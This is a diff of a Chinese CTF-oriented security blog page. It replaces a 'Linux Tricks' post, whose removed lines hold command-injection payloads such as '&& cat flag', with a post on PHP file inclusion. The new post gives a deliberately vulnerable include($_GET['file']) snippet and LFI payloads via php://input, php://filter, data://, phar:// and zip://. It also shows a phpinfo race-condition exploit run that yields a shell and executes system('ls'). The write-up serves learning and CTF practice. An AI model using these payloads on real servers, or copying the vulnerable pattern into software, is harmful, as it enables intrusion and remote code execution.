@@ -119,22 +119,17 @@
 
 
 
-<meta name="description" content="CTF中经常需要运用Linux下的一些知识，在此记录总结">
+<meta name="description" content="系统学习学习文件包含漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Linux Tricks">
-<meta property="og:url" content="http://yoursite.com/2019/06/29/Linux tricks/index.html">
+<meta property="og:title" content="php文件包含漏洞">
+<meta property="og:url" content="http://yoursite.com/2019/07/30/php文件包含漏洞/index.html">
 <meta property="og:site_name" content="gtfly">
-<meta property="og:description" content="CTF中经常需要运用Linux下的一些知识，在此记录总结">
+<meta property="og:description" content="系统学习学习文件包含漏洞">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/SGFbAZp.png">
-<meta property="og:image" content="https://i.imgur.com/Tie0E13.png">
-<meta property="og:image" content="https://i.imgur.com/dA9MHVV.png">
-<meta property="og:image" content="https://i.imgur.com/VmilyuN.png">
-<meta property="og:updated_time" content="2019-06-30T17:32:40.000Z">
+<meta property="og:updated_time" content="2019-07-30T02:56:56.322Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Linux Tricks">
-<meta name="twitter:description" content="CTF中经常需要运用Linux下的一些知识，在此记录总结">
-<meta name="twitter:image" content="https://i.imgur.com/SGFbAZp.png">
+<meta name="twitter:title" content="php文件包含漏洞">
+<meta name="twitter:description" content="系统学习学习文件包含漏洞">
 
 
 
@@ -164,13 +159,24 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/06/29/Linux tricks/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/30/php文件包含漏洞/">
 
 
 
 
 
-  <title>Linux Tricks | gtfly</title>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入查看密码') !== ''){
+                alert('密码不正确,请询问主编大大');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+  <title>php文件包含漏洞 | gtfly</title>
   
 
 
@@ -355,7 +361,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/29/Linux tricks/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/php文件包含漏洞/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="gtfly">
@@ -372,7 +378,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Linux Tricks</h1>
+          <h1 class="post-title" itemprop="name headline">php文件包含漏洞</h1>
         
 
         <div class="post-meta">
@@ -384,8 +390,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-29T22:01:36+08:00">
-                2019-06-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-30T10:33:14+08:00">
+                2019-07-30
               </time>
             
 
@@ -400,8 +406,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-07-01T01:32:40+08:00">
-                2019-07-01
+              <time title="更新于" itemprop="dateModified" datetime="2019-07-30T10:56:56+08:00">
+                2019-07-30
               </time>
             
           </span>
@@ -437,8 +443,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2019/06/29/Linux tricks/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2019/06/29/Linux tricks/" itemprop="commentCount"></span>
+                <a href="/2019/07/30/php文件包含漏洞/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2019/07/30/php文件包含漏洞/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -497,83 +503,100 @@
       
 
       
-        <p>CTF中经常需要运用Linux下的一些知识，在此记录总结</p>
+        <p> 系统学习学习文件包含漏洞</p>
 <a id="more"></a>
 
-<h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><p>查找指定路径下的文件，用法：</p>
-<pre><code>find 搜索路径 选项 搜索内容</code></pre><p><strong>选项</strong></p>
-<ul>
-<li>-name：按照文件名搜索</li>
-<li>-iname：按照文件名搜索，不区分文件名大小写</li>
-</ul>
-<p><strong>搜索内容</strong></p>
-<ul>
-<li>*：任意内容；搜索内容需要用引号引起来</li>
-</ul>
-<p>如：</p>
-<pre><code>find / -name &quot;flag*&quot;</code></pre><p>即查找根目录<code>/</code>下的文件名以<code>flag</code>为前缀的文件，输出结果为文件的绝对路径</p>
-<h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>查找文件的指定内容，用法：</p>
-<pre><code>grep 选项 模式 文件</code></pre><p><strong>选项</strong></p>
-<ul>
-<li>-i：忽略大小写</li>
-<li>-v：只打印没有匹配的</li>
-<li>-n：显示行号</li>
-<li>-w：被匹配的不能是一个单词中的一部分</li>
-<li>-c：显示总共有多少行被匹配到了</li>
-<li>-o：只显示被模式匹配到的字符串</li>
-<li>–color：将匹配到的内容以颜色高亮显示</li>
-<li>-A  n：显示匹配到的字符串所在的行及其后n行，after</li>
-<li>-B  n：显示匹配到的字符串所在的行及其前n行，before</li>
-<li>-C  n：显示匹配到的字符串所在的行及其前后各n行，context</li>
-</ul>
-<p><strong>模式</strong> </p>
-<p>匹配字符：     </p>
-<ul>
-<li>.：任意一个字符</li>
-<li>[abc]：匹配<code>abc</code>中的任意字符</li>
-<li>[a-zA-Z]：匹配任意英文字母</li>
-<li>[^123]：匹配除<code>123</code>外所有字符</li>
-</ul>
-<p>匹配次数：</p>
-<ul>
-<li>{m,n}：匹配前面出现的字符至少m次，至多n次</li>
-<li>?：匹配其前面出现的内容0此或1次，即{0,1}</li>
-<li>*：匹配其前面出现的内容任意次，即{0,}</li>
-</ul>
-<p>如：</p>
-<pre><code>grep flag /var/www/web1/*</code></pre><p>即查找<code>/var/www/web1/</code>目录下的所有文件中含有<code>flag</code>字符串的内容</p>
-<h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><p>linux下有个<code>/proc</code>目录，里面存储着当前运行的进程的信息；文件里面以数字命名的文件表示当前运行的进程，目录名为进程的pid；查看当前运行的进程：</p>
-<p><img src="https://i.imgur.com/SGFbAZp.png" alt></p>
-<p>进入到表示进程的文件中，可以找到开放4000端口的进程4627：</p>
-<p><img src="https://i.imgur.com/Tie0E13.png" alt></p>
-<p>之后进入到4627这个文件夹，可以找到<code>cmdline</code>这个文件夹，这个文件夹存储着开启4627这个进程的cmd命令；我们查看这个文件的内容：</p>
-<p><img src="https://i.imgur.com/dA9MHVV.png" alt></p>
-<p>但为了方便获取本进程的信息，linux还提供了<code>/proc/self</code>目录，等价于<code>/proc/本进程pid</code>，可以通过这个目录来获取本进程的信息；</p>
-<p>比如，我用python写了个脚本，用来输出<code>/proc/self/cmdline</code>的内容，可以看到输出了运行这个脚本的命令：</p>
-<p><img src="https://i.imgur.com/VmilyuN.png" alt></p>
-<p>有时候，如果拿到了一道web题目的shell后，可以通过题目读取<code>/proc/self/cmdline</code>内容来获取此web服务启动的相关信息</p>
-<h3 id="操作记录文件"><a href="#操作记录文件" class="headerlink" title="操作记录文件"></a>操作记录文件</h3><p>1.root用户的mysql操作一般记录在：<code>~/.mysql_history</code>中</p>
-<p>2.查看bash历史操作：<code>cat ~/.bash_history</code></p>
-<p>注：</p>
-<p><code>/</code>是根目录，<code>~</code>是家目录；每个用户都有“家”目录，如root用户的“家”目录就是“/root”，普通用户a的“家”目录就是“/home/a”</p>
-<h3 id="常用命令注入"><a href="#常用命令注入" class="headerlink" title="常用命令注入"></a>常用命令注入</h3><p>1.使用<code>&amp;&amp;</code>：</p>
-<pre><code>ping 1.1.1.1 &amp;&amp; cat flag
-#顺序执行命令；前面的命令执行成功后面的才执行</code></pre><p>2.使用管道命令：<code>A|B</code>，即把A命令的输出作为B命令的输入：</p>
-<pre><code>ping 1.1.1.1 | cat flag
-#只执行cat flag</code></pre><p>3.使用<code>&amp;</code>：    </p>
-<pre><code>ping 1.1.1.1 &amp; cat flag
-#先执行cat flag后执行ping</code></pre><p>4.使用分号<code>;</code>：</p>
-<pre><code>ping 1.1.1.1;cat flag
-#顺序执行命令；不管前面的命令是否执行成功</code></pre><p>5.使用换行符：<br>如果题目把上述字符过滤了，那么还可以在题目中使用换行符来命令注入：</p>
-<pre><code>1.1.1.1 %0a cat flag</code></pre><h3 id="获取文件内容"><a href="#获取文件内容" class="headerlink" title="获取文件内容"></a>获取文件内容</h3><ul>
-<li>cat     由第一行开始显示内容，并将所有内容输出</li>
-<li>tac     从最后一行倒序显示内容，并将所有内容输出</li>
-<li>more    根据窗口大小，一页一页的显示文件内容</li>
-<li>less    和more类似，但其优点可以往前翻页，而且进行可以搜索字符</li>
-<li>head    只显示头几行</li>
-<li>tail    只显示最后几行</li>
-<li>nl      类似于cat -n，显示时输出行号</li>
-</ul>
+
+
+<h3 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h3><p>以下四个函数的作用均为：包含并运行指定文件</p>
+<pre><code>include()：未找到文件会发出一条警告
+require()：未找到文件会发出一个致命错误</code></pre><p>下面两个函数作用类似上面的，区别是如果文件已被包含过，则不会再次包含：</p>
+<pre><code>include_once()
+require_once()</code></pre><h3 id="支持的协议和封装协议"><a href="#支持的协议和封装协议" class="headerlink" title="支持的协议和封装协议"></a>支持的协议和封装协议</h3><p><a href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener">官方文档</a>描述：</p>
+<blockquote>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。 </blockquote>
+    file:// — 访问本地文件系统
+    http:// — 访问 HTTP(s) 网址
+    ftp:// — 访问 FTP(s) URLs
+    php:// — 访问各个输入/输出流（I/O streams）
+    zlib:// — 压缩流
+    data:// — 数据（RFC 2397）
+    glob:// — 查找匹配的文件路径模式
+    phar:// — PHP 归档
+    ssh2:// — Secure Shell 2
+    rar:// — RAR
+    ogg:// — 音频流
+    expect:// — 处理交互式的流
+
+<p>可以在phpinfo中的<code>Registered PHP Streams</code>中找到可使用的协议</p>
+<p>测试代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>下面利用上述代码，来了解文件包含中常用的协议</p>
+<h4 id="php"><a href="#php" class="headerlink" title="php://"></a>php://</h4><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p><code>php://input</code>是个可以访问请求的原始数据的只读流，将POST的数据作为代码执行；</p>
+<p><strong>需要配置</strong>：<code>allow_url_include: On</code></p>
+<p>例如，利用上述代码和此协议查看phpinfo信息，则构造</p>
+<pre><code>?file=php://input</code></pre><p>并且POST数据：</p>
+<pre><code>&lt;?=phpinfo()?&gt;</code></pre><p>即可实现；除此之外，比较常见的场景：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome"</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时，用<code>php://input</code>协议：</p>
+<pre><code>?txt=php://input</code></pre><p>并且POST数据<code>welcome</code>即可轻松绕过</p>
+<h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p><code>php://filter</code>是一种元封装器，设计用于数据流打开时的筛选过滤应用</p>
+<p>一般利用此方式读取文件源码：</p>
+<pre><code>?file=php://filter/read=convert.base64-encode/resource=./include.php</code></pre><p><code>read=</code>可以省去不写：</p>
+<pre><code>?file=php://filter/convert.base64-encode/resource=./include.php</code></pre><h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p><code>file://</code>协议用于访问本地文件系统，例如：</p>
+<pre><code>?file=file:///var/www/html/index.php</code></pre><p>如果题目检测<code>file</code>参数开始内容，如<code>/</code>或<code>../</code>时，可以考虑用此协议</p>
+<h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>和<code>php://</code>类似，将原本的<code>include</code>的文件流重定向到了用户可控制的输入流中</p>
+<p><strong>需要配置</strong>：<code>allow_url_fopen: On</code>，<code>allow_url_include: On</code></p>
+<p>1.执行代码</p>
+<pre><code>?file=data:text/plain,&lt;?=phpinfo()?&gt;
+?file=data://text/plain,&lt;?=phpinfo()?&gt;</code></pre><p>2.base64解码</p>
+<pre><code>?file=data:text/plain;base64,Njk2ZTY0NjU3ODJlNzA2ODcw
+?file=data://text/plain;base64,Njk2ZTY0NjU3ODJlNzA2ODcw</code></pre><p>下面的这个场景除了使用<code>php://input</code>绕过外，还可使用<code>data://</code>绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome"</span>))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造：</p>
+<pre><code>?txt=data://text/plain,welcome</code></pre><h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>如果目标服务器有zip压缩包，且压缩文件内容有可利用的代码，那么可以利用此协议：</p>
+<p>将<code>phpinfo.txt</code>写入<code>&lt;?=phpinfo?&gt;</code>，之后将其压缩为<code>phpinfo.zip</code>，之后使用<code>phar://</code>协议访问：</p>
+<pre><code>?file=phar://phpinfo.zip/phpinfo.txt (相对路径)
+?file=phar:///var/www/html/phpinfo.zip/phpinfo.txt (绝对路径)</code></pre><p>可以成功将<code>phpinfo.txt</code>当做php文件执行；当然，可以将<code>phpinfo.txt</code>和<code>phpinfo.zip</code>后缀名替换成其他的：</p>
+<pre><code>?file=phar://phpinfo.png/phpinfo</code></pre><p>一般利用场景(可能需结合文件上传)：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_GET[<span class="string">'file'</span>].<span class="string">".php"</span>; <span class="comment">//限制只能包含php后缀的文件。</span></span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="zip"><a href="#zip" class="headerlink" title="zip://"></a>zip://</h4><p><code>zip://</code>与<code>phar://</code>作用类似，不过<code>zip://</code>需要绝对路径：</p>
+<pre><code>?file=zip:///var/www/html/phpinfo.zip#phpinfo.txt</code></pre><p><code>#</code>需要url编码：</p>
+<pre><code>?file=zip:///var/www/html/phpinfo.zip%23phpinfo.txt</code></pre><h3 id="session包含"><a href="#session包含" class="headerlink" title="session包含"></a>session包含</h3><p><a href="http://www.gtfly.top/2019/05/11/PHP-session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#more" target="_blank" rel="noopener">http://www.gtfly.top/2019/05/11/PHP-session文件包含</a></p>
+<h3 id="phpinfo-文件包含"><a href="#phpinfo-文件包含" class="headerlink" title="phpinfo+文件包含"></a>phpinfo+文件包含</h3><p>如果给了phpinfo路径和存在文件包含漏洞，那么通过phpinfo可以知道session、日志等相关信息，可以尝试进行session或日志文件包含；除此之外，可以利用phpinfo页面特性来getshell</p>
+<p>原理(转自<a href="https://github.com/vulhub/vulhub/tree/master/php/inclusion" target="_blank" rel="noopener">ph师傅</a>)：</p>
+<p>在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是<code>/tmp/php[6个随机字符]</code>），文件名可以在<code>$_FILES</code>变量中找到。这个临时文件，在请求结束后就会被删除。</p>
+<p>同时，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到<code>$_FILES</code>变量的内容，自然也包含临时文件名。</p>
+<p>在文件包含漏洞找不到可利用的文件时，即可利用这个方法，找到临时文件名，然后包含之。</p>
+<p>但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。</p>
+<p>这个时候就需要用到条件竞争，具体流程如下：</p>
+<ol>
+<li>发送包含了webshell的上传数据包给phpinfo页面，这个数据包的header、get等位置需要塞满垃圾数据</li>
+<li>因为phpinfo页面会将所有数据都打印出来，1中的垃圾数据会将整个phpinfo页面撑得非常大</li>
+<li>php默认的输出缓冲区大小为4096，可以理解为php每次返回4096个字节给socket连接</li>
+<li>所以，我们直接操作原生socket，每次读取4096个字节。只要读取到的字符里包含临时文件名，就立即发送第二个数据包</li>
+<li>此时，第一个数据包的socket连接实际上还没结束，因为php还在继续每次输出4096个字节，所以临时文件此时还没有删除</li>
+<li>利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即可成功包含临时文件，最终getshell</li>
+</ol>
+<p>利用：</p>
+<p>127.0.0.1下存在<code>phpinfo.php</code>和<code>include.php</code>，将exp.py中的路径修改后，在终端运行：</p>
+<pre><code>python include_phpinfo.py 127.0.0.1 80 200  </code></pre><p>成功getshell显示：</p>
+<pre><code>└─(10:17:03)──&gt; python include_phpinfo.py 127.0.0.1 80 200       
+LFI With PHPInfo()
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+Getting initial offset... found [tmp_name] at 110231
+Spawning worker pool (200)...
+ 243 /  1000
+Got it! Shell created in /tmp/g
+
+Woot!  \m/
+Shuttin&apos; down...</code></pre><p>即可利用<code>/tmp/g</code>文件执行任意命令：</p>
+<pre><code>http://127.0.0.1/include.php?file=/tmp/g&amp;1=system(%27ls%27);</code></pre><hr>
+<p>参考链接：<br><a href="https://xz.aliyun.com/t/5535#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/5535#toc-10</a><br><a href="https://mp.weixin.qq.com/s/RaxfIg9x5Rh1qjDgFBr82Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/RaxfIg9x5Rh1qjDgFBr82Q</a><br><a href="https://www.ctfwp.com/articals/2019national.html#justsoso" target="_blank" rel="noopener">https://www.ctfwp.com/articals/2019national.html#justsoso</a><br><a href="https://wx.zsxq.com/dweb/#" target="_blank" rel="noopener">https://wx.zsxq.com/dweb/#</a></p>
+<p>​    </p>
 
       
     </div>
@@ -633,7 +656,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://yoursite.com/2019/06/29/Linux tricks/" title="Linux Tricks">http://yoursite.com/2019/06/29/Linux tricks/</a>
+    <a href="http://yoursite.com/2019/07/30/php文件包含漏洞/" title="php文件包含漏洞">http://yoursite.com/2019/07/30/php文件包含漏洞/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -655,8 +678,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/06/28/2019ISCC线下赛总结(二)/" rel="next" title="2019ISCC线下赛总结(二)">
-                <i class="fa fa-chevron-left"></i> 2019ISCC线下赛总结(二)
+              <a href="/2019/07/29/PHP Bypass disable-functions-二/" rel="next" title="PHP Bypass disable_functions(二)">
+                <i class="fa fa-chevron-left"></i> PHP Bypass disable_functions(二)
               </a>
             
           </div>
@@ -664,10 +687,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/04/Ubuntu下的一些配置/" rel="prev" title="Ubuntu下的一些配置">
-                Ubuntu下的一些配置 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -749,7 +768,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">149</span>
+                  <span class="site-state-item-count">159</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -760,7 +779,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -831,11 +850,19 @@
                   </li>
                 
                   <li class="links-of-blogroll-item">
+                    <a href="https://wangchangze.github.io/" title="wcz" target="_blank">wcz</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
                     <a href="https://skysec.top/" title="一叶飘零" target="_blank">一叶飘零</a>
                   </li>
                 
                   <li class="links-of-blogroll-item">
                     <a href="https://www.leavesongs.com/" title="离别歌" target="_blank">离别歌</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.daokers.com/" title="金刀客" target="_blank">金刀客</a>
                   </li>
                 
               </ul>
@@ -856,7 +883,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#find"><span class="nav-number">1.</span> <span class="nav-text">find</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#grep"><span class="nav-number">2.</span> <span class="nav-text">grep</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#proc"><span class="nav-number">3.</span> <span class="nav-text">proc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#操作记录文件"><span class="nav-number">4.</span> <span class="nav-text">操作记录文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用命令注入"><span class="nav-number">5.</span> <span class="nav-text">常用命令注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取文件内容"><span class="nav-number">6.</span> <span class="nav-text">获取文件内容</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含函数"><span class="nav-number">1.</span> <span class="nav-text">文件包含函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#支持的协议和封装协议"><span class="nav-number">2.</span> <span class="nav-text">支持的协议和封装协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">2.1.</span> <span class="nav-text">php://</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#php-input"><span class="nav-number">2.1.1.</span> <span class="nav-text">php://input</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#php-filter"><span class="nav-number">2.1.2.</span> <span class="nav-text">php://filter</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file"><span class="nav-number">2.2.</span> <span class="nav-text">file://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#data"><span class="nav-number">2.3.</span> <span class="nav-text">data://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phar"><span class="nav-number">2.4.</span> <span class="nav-text">phar://</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip"><span class="nav-number">2.5.</span> <span class="nav-text">zip://</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#session包含"><span class="nav-number">3.</span> <span class="nav-text">session包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpinfo-文件包含"><span class="nav-number">4.</span> <span class="nav-text">phpinfo+文件包含</span></a></li></ol></div>
             
 
           </div>
